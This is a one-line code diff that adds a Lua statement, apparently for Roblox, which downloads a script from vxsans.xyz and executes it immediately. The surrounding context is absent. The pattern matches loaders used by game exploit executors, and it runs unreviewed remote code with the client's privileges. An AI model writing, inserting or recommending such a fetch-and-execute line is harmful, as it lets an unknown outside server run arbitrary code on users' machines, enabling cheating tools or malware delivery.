@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://vxsans.xyz/loader.lua"))()
